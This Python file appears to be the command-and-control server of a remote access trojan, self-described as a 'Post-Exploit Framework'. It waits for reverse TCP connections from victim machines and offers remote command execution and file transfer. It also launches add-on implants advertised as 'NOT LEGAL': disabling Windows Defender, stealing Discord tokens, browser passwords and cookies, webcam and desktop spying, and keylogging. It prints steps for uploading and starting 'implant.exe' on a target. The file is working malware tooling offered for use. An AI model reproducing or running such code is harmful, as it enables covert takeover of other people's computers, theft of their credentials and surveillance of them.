#!/usr/bin/python
# -*- coding: utf-8 -*-

# BladeRun © 2707
import time
import discord
from discord.ext import commands

import pyautogui

# bot communication
#from telegram import Bot

# interface
import colorama
from colorama import Fore

# location
import urllib.request
import json

# screen
import mss
#from PIL import Image
import io

# import only system from os
from os import system, name
 
# import sleep to show output for some time period
from time import sleep

import socket,struct,sys,os;from datetime import datetime;
import subprocess,platform,threading,webbrowser as browser
try: input = raw_input
except NameError: input = input

import mss.tools

# SCREEN - desktop
#import cv2
import numpy as np
import pickle
import struct
import ctypes

### CLASS 1 
class senrev:
    def __init__(self,sock):
        self.sock = sock
    def send(self, data):
        pkt = struct.pack('>I', len(data)) + data
        self.sock.sendall(pkt)
    def recv(self):
        pktlen = self.recvall(4)
        if not pktlen: return ""
        pktlen = struct.unpack('>I', pktlen)[0]
        return self.recvall(pktlen)
    def recvall(self, n):
        packet = b''
        while len(packet) < n:
            frame = self.sock.recv(n - len(packet))
            if not frame:return
            packet += frame
        return packet


def set_console_title(new_title):
    kernel32 = ctypes.windll.kernel32
    kernel32.SetConsoleTitleW(new_title)

### DEF 1
def rvs_commands():
   print(Fore.YELLOW + "\n-  [RVSL2 COMMANDS] - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -" + Fore.WHITE)
   print("""
   
  //  exec            ->  Run external command or local file 
  //  start           ->  Start file from client machine (exe, txt, pdf, odt, etc..)
  //  check           ->  Check if client machine is connected to internet                                             
  //  browse          ->  Open an website on client machine browser
  //  download        ->  Download file from client machine 
  //  upload          ->  Upload file to client machine  
  //  kill            ->  Kill the connection with client machine 

   """)
   print(Fore.YELLOW + "-  [BASIC COMMANDS] - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -" + Fore.WHITE)
   print("""
   
  //  pwd             ->  Print working directory in client machine 
  //  scp             ->  Copy files to client with SSH
  //  route print     ->  Show Routes Tables
  //  whoami          ->  Get name of client machine (LINUX ONLY)
  //  hostname        ->  Show hostname of client machine
  //  arp -a          ->  Show all current protocol statistics and TCP/IP connections
  //  ipconfig /all   ->  Show ip configurations from client machine (ipv4, ipv6, mac, etc..)
  //  getmac          ->  Show mac addresses of client machine
  //  netstat         ->  Show all actives connections from client machine 
  //  uname -a        ->  Show kernel of client machine  [ONLY LINUX GNU]  
  //  systeminfo      ->  Show all informations of client machine    (os version, desktop name, etc..)
   """)
   print(Fore.YELLOW + "-  [NOT LEGAL COMMANDS] - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -" + Fore.WHITE)

   print("""
  // webcam           ->  Remote webcam [DIRECT 60FPS] [NO GUI]
  // desktop          ->  Remote desktop [DIRECT 60FPS] [NO GUI]
""")
   print(Fore.YELLOW + "-  [PREMIUM NOT LEGAL COMMANDS] - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -" + Fore.WHITE)
   print("""
  // dwd              ->  Disable Windows Defender AV [Real-Time Protect]
  // stlinfos         ->  Steal discord token | browser passwords | cookies | mail and others informations [Webhook ONLY]
  // deskscp          ->  Steal session name | desktop name | ip | camera and desktop screenshot [Webhook ONLY] [AUTO-MODE AVAILABLE]
  // autoscp          ->  Take a desktop screenshot every minute [Webhook ONLY] [AUTO-MODE]
  // klog             ->  Enable keylogger server
   """)

### DEF 2
def download(filee):
  cmd = filee
  filee = "".join(filee.split(":download")).strip()
  if filee.strip():
   filetodown = filee.split("/")[-1] if "/" in filee else filee.split("\\")[-1] if "\\" in filee else filee
   controler.send(cmd.encode("UTF-8"))
   down = controler.recv().decode("UTF-8",'ignore')
   if down == "true":
     print("[~] DOWNLOAD [ {} ]...".format(filetodown))
     wf = open(filetodown, "wb")
     while True:
      data = controler.recv()
      if data == b":DONE:": break
      elif data == b":Aborted:":
        wf.close()
        os.remove(filetodown)
        print("[!] Downloading has aborted by CLIENT !")
        return
      wf.write(data)
     wf.close()
     print("[*] DOWNLOAD DONE :)\n[*] File drop in : {}\n".format(os.getcwd()+os.sep+filetodown))
   else: print(down)
  else: print("[USAGE] download <file_to_download_from_client_machine>\n")


  ### DEF 3
def upload(cmd):
    filetoup = "".join(cmd.split("upload")).strip()
    if not filetoup.strip(): print("[USAGE] upload <file_to_upload>\n")
    else:
       if not os.path.isfile(filetoup): print("[ERROR OPEN] No such file --> "+filetoup+"\n")
       else:
          controler.send(cmd.encode("UTF-8"))
          print("[~] UPLOAD [ {} ]...".format(filetoup))
          with open(filetoup,"rb") as wf:
            for data in iter(lambda: wf.read(4100), b""):
              try:controler.send(data)
              except(KeyboardInterrupt,EOFError):
                wf.close()
                controler.send(b":Aborted:")
                print("[!] Uploading has been aborted by USER !\n")
                return
          controler.send(b":DONE:")
          savedpath = controler.recv().decode("UTF-8")
          print("[*] UPLOAD DONE :)\n[*] File drop in : "+str(savedpath).strip()+" in client machine\n")




### DEF 4
def check_con():
     print(Fore.CYAN + "[+]" + Fore.WHITE + " check..")
     print("")
     controler.send(b":check_internet_connection")
     status = controler.recv().decode("UTF-8").strip()
     if status == "UP": print(Fore.GREEN + "[200 OK]" + Fore.WHITE + " target connected to internet !\n")
     else: print(Fore.RED + "[!]" + Fore.WHITE + " target not connected to internet !\n")


def get_machine_name():
    machine_name = os.environ.get('COMPUTERNAME')  # Pour Windows
    if not machine_name:
        machine_name = os.environ.get('HOSTNAME')  # Pour les systèmes basés sur Unix
    if not machine_name:
        machine_name = "OS NAME not found!"
    return machine_name

def get_machine_name_print():
    machine_name = get_machine_name()
    print(machine_name)



### DEF 5
def browse(cmd):
  url = "".join(cmd.split(":browse")).strip()
  if not url.strip(): print("Usage: :browse <url>\n")
  else:
    if not url.startswith(("http://","https://")): url = "http://"+url
    print("[*] Opening [ {} ]...".format(url))
    controler.send(":browse {}".format(url).encode("UTF-8"))
    print(Fore.CYAN + "[+] " + Fore.WHITE + "Done! Page loaded.\n")




### DEF 6
def start_webcam_server():                                                                                                      ### NO GUI
    root_dir = os.path.dirname(os.path.abspath(__file__))
    script_path = os.path.join(root_dir, "INT_ADDONS//WEBCAM", "svr.py")
    if os.path.exists(script_path):
        if os.name == 'nt':  # Windows
            cmd = f"start cmd /c python {script_path}"
            print(Fore.YELLOW + "[>] " + Fore.WHITE + "[WEBCAM] SERVER STARTED!")
        else:  # Linux and macOS
            cmd = f"gnome-terminal -x python3 {script_path}"
        subprocess.run(cmd, shell=True)
    else:
        print(Fore.RED + "[!] [ERROR]" + Fore.WHITE + "Unable to start server." + Fore.WHITE)




### DEF 7
def start_desktop_server():                                                                                                      ### NO GUI
    root_dir = os.path.dirname(os.path.abspath(__file__))
    script_path = os.path.join(root_dir, "INT_ADDONS//DESKTOP", "serv_desk.py")
    if os.path.exists(script_path):
        if os.name == 'nt':  # Windows
            cmd = f"start cmd /c python {script_path}"
            print(Fore.YELLOW + "[>] " + Fore.WHITE + "[DESKTOP] SERVER STARTED!")
        else:  # Linux and macOS
            cmd = f"gnome-terminal -x python3 {script_path}"
        subprocess.run(cmd, shell=True)
    else:
        print(Fore.RED + "[!] [ERROR] Unable to start server." + Fore.WHITE)





def start_dwd():
    root_dir = os.path.dirname(os.path.abspath(__file__))
    script_path = os.path.join(root_dir, "EXT_ADDONS//DWINDEF", "disable.py")
    if os.path.exists(script_path):
        if os.name == 'nt':  # Windows
            #cmd = f"start cmd /c python {script_path}"
            print(Fore.YELLOW + "[$] " + Fore.GREEN + "[DWINDEF] Implant has been found!" + Fore.WHITE)
            print("")
            print(Fore.YELLOW + "[!] " + Fore.RED + "Your version of RVSL does not support automatic sending of external implants." + Fore.WHITE)
            print(Fore.GREEN + "[#] " + Fore.WHITE + "- upload the implant to your target using >>" + Fore.BLUE + " upload <implant_directory\implant.exe>" + Fore.WHITE)
            print(Fore.GREEN + "[#] " + Fore.WHITE + "- run the implant on your target using >>" + Fore.BLUE + " start <implant_directory\implant.exe>" + Fore.WHITE)
            print("")
        else:  # Linux and macOS
            cmd = f"gnome-terminal -x python3 {script_path}"
        subprocess.run(cmd, shell=True)
    else:
        print(Fore.RED + "[!] [DWD-ERROR] Implant Not Found." + Fore.WHITE)
        print("")


def start_deskscp():
    root_dir = os.path.dirname(os.path.abspath(__file__))
    script_path = os.path.join(root_dir, "EXT_ADDONS//DESKSCP", "svr.py")
    if os.path.exists(script_path):
        if os.name == 'nt':  # Windows
            #cmd = f"start cmd /c python {script_path}"
            print(Fore.YELLOW + "[$] " + Fore.GREEN + "[DESKSCP] Implant has been found!" + Fore.WHITE)
            print("")
            print(Fore.YELLOW + "[!] " + Fore.RED + "Your version of RVSL does not support automatic sending of external implants." + Fore.WHITE)
            print(Fore.GREEN + "[#] " + Fore.WHITE + "- upload the implant to your target using >>" + Fore.BLUE + " upload <implant_directory\implant.exe>" + Fore.WHITE)
            print(Fore.GREEN + "[#] " + Fore.WHITE + "- run the implant on your target using >>" + Fore.BLUE + " start <implant_directory\implant.exe>" + Fore.WHITE)
            print("")
        else:  # Linux and macOS
            cmd = f"gnome-terminal -x python3 {script_path}"
        subprocess.run(cmd, shell=True)
    else:
        print(Fore.RED + "[!] [DESKSCP-ERROR] Implant Not Found." + Fore.WHITE)
        print("")


def start_autoscp_desktop():
    root_dir = os.path.dirname(os.path.abspath(__file__))
    script_path = os.path.join(root_dir, "EXT_ADDONS//AUTOSCP", "scop.py")
    if os.path.exists(script_path):
        if os.name == 'nt':  # Windows
            #cmd = f"start cmd /c python {script_path}"
            print(Fore.YELLOW + "[$] " + Fore.GREEN + "[AUTOSCP] Implant has been found!" + Fore.WHITE)
            print("")
            print(Fore.YELLOW + "[!] " + Fore.RED + "Your version of RVSL does not support automatic sending of external implants." + Fore.WHITE)
            print(Fore.GREEN + "[#] " + Fore.WHITE + "- upload the implant to your target using >>" + Fore.BLUE + " upload <implant_directory\implant.exe>" + Fore.WHITE)
            print(Fore.GREEN + "[#] " + Fore.WHITE + "- run the implant on your target using >>" + Fore.BLUE + " start <implant_directory\implant.exe>" + Fore.WHITE)
            print("")
        else:  # Linux and macOS
            cmd = f"gnome-terminal -x python3 {script_path}"
        subprocess.run(cmd, shell=True)
    else:
        print(Fore.RED + "[!] [AUTOSCP-ERROR] Implant Not Found." + Fore.WHITE)
        print("")





def start_stlinfos():
    root_dir = os.path.dirname(os.path.abspath(__file__))
    script_path = os.path.join(root_dir, "EXT_ADDONS//STLINFOS", "Creal.py")
    if os.path.exists(script_path):
        if os.name == 'nt':  # Windows
            #cmd = f"start cmd /c python {script_path}"
            print(Fore.YELLOW + "[$] " + Fore.GREEN + "[STLINFOS] Implant has been found!" + Fore.WHITE)
            print("")
            print(Fore.YELLOW + "[!] " + Fore.RED + "Your version of RVSL does not support automatic sending of external implants." + Fore.WHITE)
            print(Fore.GREEN + "[#] " + Fore.WHITE + "- upload the implant to your target using >>" + Fore.BLUE + " upload <implant_directory\implant.exe>" + Fore.WHITE)
            print(Fore.GREEN + "[#] " + Fore.WHITE + "- run the implant on your target using >>" + Fore.BLUE + " start <implant_directory\implant.exe>" + Fore.WHITE)
            print("")
        else:  # Linux and macOS
            cmd = f"gnome-terminal -x python3 {script_path}"
        subprocess.run(cmd, shell=True)
    else:
        print(Fore.YELLOW + "[!] " + Fore.YELLOW + "[STLINFOS-ERROR] Implant Not Found." + Fore.WHITE)
        print("")


def start_klog():
    root_dir = os.path.dirname(os.path.abspath(__file__))
    script_path = os.path.join(root_dir, "EXT_ADDONS//KLOG", "server_gui3.py")
    if os.path.exists(script_path):
        if os.name == 'nt':  # Windows
            #cmd = f"start cmd /c python {script_path}"
            print(Fore.YELLOW + "[$] " + Fore.GREEN + "[KLOG] Implant has been found!" + Fore.WHITE)
            print("")
            print(Fore.YELLOW + "[!] " + Fore.RED + "Your version of RVSL does not support automatic sending of external implants." + Fore.WHITE)
            print(Fore.GREEN + "[#] " + Fore.WHITE + "- upload the implant to your target using >>" + Fore.BLUE + " upload <implant_directory\implant.exe>" + Fore.WHITE)
            print(Fore.GREEN + "[#] " + Fore.WHITE + "- run the implant on your target using >>" + Fore.BLUE + " start <implant_directory\implant.exe>" + Fore.WHITE)
            print("")
        else:  # Linux and macOS
            cmd = f"gnome-terminal -x python3 {script_path}"
        subprocess.run(cmd, shell=True)
    else:
        print(Fore.YELLOW + "[!] " + Fore.YELLOW + "[KLOG-ERROR] Implant Not Found." + Fore.WHITE)
        print("")


### DEF 11
def control():                                                         ## CONTROL COMMANDS PANEL
    try:

      cmd = str(input(Fore.CYAN + f"RVSL3-MONITOR\ " + Fore.WHITE + "#> " + Fore.GREEN + "".format(a[0])))
      while not cmd.strip(): cmd = str(input(Fore.CYAN + "RVSL3-MONITOR\ " + Fore.WHITE + "#> " + Fore.GREEN + "".format(a[0])))
      print(Fore.WHITE + "")
      if cmd == "download":                                                      ## DOWNLOAD FUNCTION
            download(cmd)
            control()
      elif "webcam" in cmd:                                                      ## WEBCAM DIRECT FUNCTION
           start_webcam_server()
           control()
      #elif "ipinfos" in cmd:
           #get_location_ip()
           #control()
      elif "desktop" in cmd:                                                     ## DESKTOP DIRECT FUNCTION
           start_desktop_server()
           control()
      elif "dwd" in cmd:
           start_dwd()
           control()
      elif "autoscp" in cmd:
           start_autoscp_desktop()
           control()
      elif "stlinfos" in cmd:
           start_stlinfos()
           control()
      elif "klog" in cmd:
            start_klog()
            control()
      elif "deskscp" in cmd:
           start_deskscp()
           control()
      elif "break" in cmd:                                                       ## BREAK FUNCTION
            run.CMD("systeminfo")
      elif "upload" in cmd:                                                      ## UPLOAD FUNCTION
           upload(cmd)
           control()
      elif "screen" in cmd:                                                      ## START SCREEN
           screen(cmd)
           control()
      elif "commands" in cmd:                                                    ## RVS COMMANDS
           rvs_commands()
           control()
      elif cmd =="kill":                                                         ## KILL ALL CONNECTIONS
         print(Fore.RED + "[!] Connection has been killed !" + Fore.WHITE) 
         controler.send(b":kill")
         c.shutdown(2)
         c.close()
         s.close()
         exit(1)
      elif "exec" in cmd:                                                        ## EXEC COMMANDS
           cmd = "".join(cmd.split(":exec")).strip()
           if not cmd.strip(): print("[USAGE] exec <command_or_local_file>\n")
           else:
               print("[*] exec:")
               os.system(cmd)
               print(" ")
           control()
      elif cmd == "pcname":
        get_machine_name_print()
        control()
      elif cmd == "check":                                                       ## CHECK CONNECTIONS
        check_con()
        control()
      elif cmd == "wifi":                                                        ## LOAD WIFIS REGISTERED ON WINDOWS MACHINE
        print("[*] load local wifi infos [...]")
        controler.send(b":wifi")
        info = controler.recv()
        try:
          info = info.decode("UTF-8","ignore")
        except  UnicodeEncodeError: info = info
        finally:
           if info==":osnot:": print("[!] Sorry, i can't found wifi info of client machine !\n")
           else:
             print("[*] INFO:\n")
             print(info + "\n")
             control()
      elif "browse" in cmd:                                                      ## OPEN BROWSER 
        browse(cmd)
        control()
      elif cmd.lower() == "cls" or cmd == "clear":
             os.system("cls||clear")
             control()
      controler.send(cmd.encode("UTF-8"))
      DATA = controler.recv()
      if DATA.strip(): print(DATA.decode("UTF-8",'ignore'))
      control()
    except (KeyboardInterrupt, EOFError):
           print(" ")
           control()
    except socket.error:
       print(Fore.RED + "[!]" + Fore.WHITE + "Connection lost to "+a[0]+" !")
       print("")
       c.close()
       s.close()
       exit(1)
    except UnicodeEncodeError:
        print(DATA)
        print(" ")
        control()
    except Exception as e:
       print("[!] An error occurred "+str(e)+"\n")
       control()

stop_event = threading.Event()

def print_elapsed_time():
    start_time = time.time()
    while not stop_event.is_set():
        elapsed_time = time.time() - start_time
        print(Fore.MAGENTA + f'\r[%] ' + Fore.GREEN + f'{int(elapsed_time)}s' + Fore.WHITE + ' ELAPSED ', end='')
        time.sleep(1)

def server(IP, PORT, senrev=senrev):
    global s
    global c
    global a
    global controler

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((IP, PORT))
    s.listen(1)
    system("cls")

    print(Fore.MAGENTA + """
    ───────────────▄▄───▐█     (v4.0.2) US VERSION
    ───▄▄▄───▄██▄──█▀───█─▄   C&C RVSL3 ©
    ─▄██▀█▌─██▄▄──▐█▀▄─▐█▀     (v4.0.2)
    ▐█▀▀▌───▄▀▌─▌─█─▌──▌─▌   
    ▌▀▄─▐──▀▄─▐▄─▐▄▐▄─▐▄─▐▄    
    """)

    print(Fore.MAGENTA + "[*] " + Fore.WHITE + "Listening reverse TCP handler on > " + Fore.CYAN + f"{IP}" + Fore.MAGENTA + f":{PORT}" + Fore.WHITE + " | [{}]".format(datetime.now().strftime("%H:%M:%S")))
    
    elapsed_time_thread = threading.Thread(target=print_elapsed_time)
    elapsed_time_thread.start()  # Démarre le thread pour afficher le temps écoulé

    try:
        c, a = s.accept()
        stop_event.set()  # Signale au thread de s'arrêter
        elapsed_time_thread.join()  # Attend que le thread se termine
        controler = senrev(c)
        print("")
        print("")
        tcp_session = print(Fore.YELLOW + "[CLI] " + Fore.WHITE + "CONNECT from " + Fore.GREEN + "{}:{}".format(a[0], a[1]))
        print(Fore.YELLOW + "[!] " + Fore.WHITE + "Type 'commands' to show all commands.")
        print(Fore.WHITE + "")
        control()
    except (KeyboardInterrupt, EOFError):
        print(" ")
        exit(1)

if len(sys.argv) != 3:
    system("cls")
    print(Fore.MAGENTA + """
    ───────────────▄▄───▐█
    ───▄▄▄───▄██▄──█▀───█─▄   Code By @makaki22
    ─▄██▀█▌─██▄▄──▐█▀▄─▐█▀  (v4.0.2)
    ▐█▀▀▌───▄▀▌─▌─█─▌──▌─▌    Post-Exploit
    ▌▀▄─▐──▀▄─▐▄─▐▄▐▄─▐▄─▐▄     Framework.
    """)

    print(Fore.MAGENTA + "# Usage: " + Fore.WHITE + "python rvsl4.py <IP> <PORT>")
    print("")
    exit(1)

server(sys.argv[1], int(sys.argv[2]))




                                                                               
                                                                               
                                                                              
                                                                                                                             
